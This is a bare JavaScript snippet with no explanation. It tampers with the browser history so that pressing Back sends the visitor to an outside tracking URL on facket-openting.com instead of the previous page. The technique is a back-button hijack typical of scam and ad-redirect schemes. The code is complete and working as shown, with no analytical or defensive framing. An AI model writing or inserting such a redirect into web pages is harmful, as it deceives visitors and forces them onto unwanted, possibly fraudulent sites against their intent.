(function (window, location) {
  history.replaceState(null, document.title, location.pathname + "#!/history");
  history.pushState(null, document.title, location.pathname);

  window.addEventListener(
    "popstate",
    function () {
      if (location.hash === "#!/history") {
        history.replaceState(null, document.title, location.pathname);
        setTimeout(function () {
          location.replace(
            "https://facket-openting.com/d0a757bf-1d53-4dc4-9d6b-1a56100d7d1c?source=back"
          );
        }, 0);
      }
    },
    false
  );
})(window, location);
